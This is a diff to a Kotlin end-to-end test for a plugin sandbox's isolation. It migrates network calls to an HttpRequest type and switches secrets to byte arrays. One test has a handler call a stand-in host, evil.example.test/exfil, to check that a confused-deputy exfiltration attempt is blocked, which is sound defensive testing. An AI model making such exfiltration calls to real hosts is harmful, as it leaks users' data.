@@ -13,6 +13,7 @@ import com.morainet.mcos.sdk.CommandManifestEntry
 import com.morainet.mcos.sdk.CommandResult
 import com.morainet.mcos.sdk.ExecutionContext
 import com.morainet.mcos.sdk.HostServices
+import com.morainet.mcos.sdk.HttpRequest
 import com.morainet.mcos.sdk.McosPlugin
 import com.morainet.mcos.sdk.PluginManifest
 import com.morainet.mcos.sdk.ProviderInfo
@@ -152,16 +153,18 @@ class IsolationEndToEndTest {
         val h = harness(handler = object : CommandHandler {
             override suspend fun invoke(ctx: ExecutionContext): CommandResult {
                 val resp = ctx.services.net.request(
-                    method = "POST",
-                    url = "https://api.example.test/v1/thing",
-                    body = "{{secret.apiToken}}",
-                    headers = mapOf("Authorization" to "Bearer {{secret.apiToken}}"),
+                    HttpRequest(
+                        method = "POST",
+                        url = "https://api.example.test/v1/thing",
+                        body = "{{secret.apiToken}}".toByteArray(),
+                        headers = mapOf("Authorization" to "Bearer {{secret.apiToken}}"),
+                    ),
                 )
                 ctx.services.sandbox!!.write("out/result.txt", "ok".toByteArray())
-                return CommandResult.Ok(JsonPrimitive(resp.body ?: "null"))
+                return CommandResult.Ok(JsonPrimitive(resp.bodyText))
             }
         })
-        h.secureStore.put("apiToken", "tok-e2e")
+        h.secureStore.put("apiToken", "tok-e2e".toByteArray())
 
         val result = h.executor.execute(
             commandId,
@@ -187,7 +190,7 @@ class IsolationEndToEndTest {
             override suspend fun invoke(ctx: ExecutionContext): CommandResult {
                 // The URL lives in handler code, not in the audited args —
                 // exactly the confused-deputy case §8.2 exists for.
-                ctx.services.net.request("GET", "https://evil.example.test/exfil")
+                ctx.services.net.request(HttpRequest(url = "https://evil.example.test/exfil"))
                 error("unreachable")
             }
         })
@@ -207,7 +210,7 @@ class IsolationEndToEndTest {
         // still refuse egress regardless of the approval.
         val h = harness(handler = object : CommandHandler {
             override suspend fun invoke(ctx: ExecutionContext): CommandResult {
-                ctx.services.net.request("GET", "https://api.example.test/v1")
+                ctx.services.net.request(HttpRequest(url = "https://api.example.test/v1"))
                 error("unreachable")
             }
         })
